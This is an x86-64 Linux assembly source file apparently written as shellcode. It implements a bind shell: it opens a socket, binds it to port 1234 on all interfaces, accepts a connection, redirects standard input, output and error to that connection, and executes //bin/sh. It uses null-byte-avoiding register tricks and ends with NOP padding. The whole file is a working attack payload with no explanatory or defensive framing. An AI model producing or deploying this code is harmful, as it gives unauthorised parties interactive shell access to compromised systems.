.globl _start
.section .text
_start:
jmp .B1
.endl:
mov %rbp,%rsp
pop %rbp
ret
.B1:
push %rbp
movq %rsp,%rbp
andq $0xfffffffffffffff0,%rsp
sub $0x20,%rsp
#socket(2,1,0)
xor %rax,%rax
addq $41,%rax
xor %rdi,%rdi
addq $2,%rdi
xor %rsi,%rsi
inc %rsi
xor %rdx,%rdx 
syscall


mov %rax,%rdi 
mov %rax,-0x08(%rbp)
cmpl   $0xffffffff,-0x08(%rbp)
jne .L1
jmp .endl
.L1:

xor %rax,%rax
pushq %rax  #bzero(&(my_addr.sin_zero), 8);
pushw %ax  # my_addr.sin_addr.s_addr = INADDR_ANY;
pushw %ax   #
pushw  $0xd204 # my_addr.sin_port = htons(PORT);PORT=1234=0X04D2 htons(PORT)=0XD204
pushw $0x02   #my_addr.sin_family = AF_INET;

movq %rsp,%rsi
xor %rdx,%rdx
addq $16,%rdx
xor %rax,%rax
addq $49,%rax #bind syscall number
syscall
mov %rax,-0x10(%rbp)
cmpl   $0xffffffff,-0x10(%rbp)
jne .L2
jmp .endl

.L2:
xor %rax,%rax
addq $50,%rax #listen syscall number
xor %rsi,%rsi
inc %rsi
syscall

xor %rax,%rax
addq $43,%rax #accept syscall number
xor %rsi,%rsi
xor %rdx,%rdx
syscall

movq %rax,-0x18(%rbp)#newfd

xor %rax,%rax
addq $33,%rax #dup2
mov -0x18(%rbp),%rdi
xor %rsi,%rsi #stdin
syscall

xor %rax,%rax
addq $33,%rax #dup2
mov -0x18(%rbp),%rdi
xor %rsi,%rsi 
inc %rsi #stdout
syscall

xor %rax,%rax
addq $33,%rax #dup2
mov -0x18(%rbp),%rdi
xor %rsi,%rsi 
addq $2,%rsi #inc %rsi   #stderr
syscall

xor %rax,%rax
pushq %rax
movq %rsp,%rdx
movq $0x68732f6e69622f2f,%rbx
push %rbx
movq %rsp,%rdi
pushq %rax
pushq %rdi
movq %rsp,%rsi
addq $59,%rax #execve
syscall

.endl_2:
mov %rbp,%rsp
pop %rbp
ret
.fill 16,1,0x90  # 再填充16个0x90